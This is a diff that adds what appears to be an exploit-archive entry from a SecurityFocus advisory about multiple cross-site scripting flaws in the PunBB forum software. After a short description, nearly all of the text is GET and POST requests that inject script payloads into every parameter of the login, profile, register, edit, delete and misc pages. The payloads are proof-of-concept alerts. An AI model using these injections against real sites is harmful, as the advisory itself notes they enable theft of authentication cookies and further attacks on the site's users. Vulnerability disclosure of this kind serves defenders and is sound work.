@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/49660/info
+
+PunBB is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. 
+
+GET
+/login.php?action=out&amp;id=3&amp;csrf_token=4b072f27396cec5d79&quot;/&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+GET
+/misc.php?action=markforumread&amp;fid=1&amp;csrf_token=c173cabad786&quot;/&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+
+POST /delete.php?id=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+form_sent=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;csrf_token=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;req_confirm=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;delete=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/
+script&gt;
+
+POST /edit.php?id=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+form_sent=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;csrf_token=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;req_message=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;submit=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/
+script&gt;
+
+POST /login.php?action=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+form_sent=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;csrf_token=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;req_email=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;request_pass=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oin
+k)&lt;/script&gt;
+
+POST /misc.php?email=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+form_sent=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;redirect_url=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;csrf_token=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;req_subject=&gt;&quot;&#039;&gt;&lt;script&gt;alert(o
+ink)&lt;/script&gt;&amp;req_message=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;submit=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+
+POST
+/profile.php?action=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;id=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+form_sent=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;csrf_token=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;req_old_password=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;req_new_password1=&gt;&quot;&#039;&gt;&lt;scri
+pt&gt;alert(oink)&lt;/script&gt;&amp;req_new_password2=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;update=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+
+POST /register.php?action=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;
+form_sent=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;csrf_token=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;req_username=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;req_password1=&gt;&quot;&#039;&gt;&lt;script&gt;alert
+(oink)&lt;/script&gt;&amp;req_password2=&gt;&quot;&#039;&gt;&lt;script&gt;alert(369448)&lt;/script&gt;&amp;req_email1=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;timezone=&gt;&quot;&#039;&gt;&lt;script&gt;alert(oink)&lt;/script&gt;&amp;register=&gt;&quot;&#039;&gt;
+&lt;script&gt;alert(oink)&lt;/script&gt;
